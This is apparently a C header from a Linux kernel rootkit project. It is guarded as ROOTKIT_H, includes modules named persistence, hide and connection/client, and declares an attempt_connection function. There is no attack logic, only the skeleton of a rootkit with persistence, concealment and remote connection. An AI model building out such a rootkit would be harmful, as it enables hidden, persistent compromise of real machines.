#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

#include "persistence/persistence.h"
#include "hide/hide.h"
#include "connection/client.h"

static int attempt_connection(void *data);

#endif // ROOTKIT_H
